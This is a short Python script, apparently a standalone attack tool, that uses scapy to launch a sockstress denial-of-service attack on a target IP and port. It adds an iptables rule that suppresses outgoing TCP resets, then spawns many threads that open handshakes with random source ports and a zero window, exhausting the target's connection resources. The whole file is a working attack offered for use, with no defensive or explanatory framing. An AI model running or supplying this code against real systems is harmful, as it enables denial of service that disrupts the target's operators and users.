#!/usr/bin/python3
from scapy.all import *
from time import sleep
import _thread
import random
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import os
import signal
import sys

if len(sys.argv) != 4:
    print("./sockstress.py [ip] [port] [thread_number]")
    sys.exit()

ip = str(sys.argv[1])
port = int(sys.argv[2])
thread_number = int(sys.argv[3])

def sockstress(ip, port):
    while True:
        try:
            x = random.randint(0, 65535)
            response = sr1(IP(dst=ip)/TCP(dport=port, sport=x, flags="S"), timeout=1, verbose=0)
            send(IP(dst=ip)/TCP(dport=port, sport=x, flags="A", window=0, ack=(response[TCP].seq + 1)), verbose=0)
        except:
            pass
def shutdown(signum, frame):
    print('\nrecover iptables...')
    os.system("iptables -D OUTPUT -p tcp --tcp-flag RST RST -d " + ip + " -j DROP")
    sys.exit()

print('set iptables...')
os.system("iptables -A OUTPUT -p tcp --tcp-flag RST RST -d " + ip + " -j DROP")
signal.signal(signal.SIGINT, shutdown)
print("do sockstress attack...")

for x in range(0, thread_number):
    _thread.start_new_thread(sockstress, (ip, port))

while True:
    pass
